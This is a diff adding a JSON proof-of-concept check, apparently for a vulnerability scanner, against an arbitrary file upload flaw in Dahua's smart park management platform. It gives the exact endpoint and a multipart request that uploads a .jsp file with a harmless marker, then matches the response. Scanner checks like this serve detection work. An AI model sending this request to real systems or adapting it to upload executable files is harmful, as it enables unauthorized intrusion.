@@ -1,0 +1,19 @@
+{
+  "poc": "大华智慧园区综合管理平台 video 任意文件上传",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/publishing/publishing/material/file/video",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7"
+      },
+      "data": "--dd8f988919484abab3816881c55272a7\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"vuleyetest.jsp\"\n\nvuleyetest\n--dd8f988919484abab3816881c55272a7\nContent-Disposition: form-data; name=\"Submit\"\n\nsubmit\n--dd8f988919484abab3816881c55272a7--",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["id", "success"]
+      }
+    }
+  ]
+}
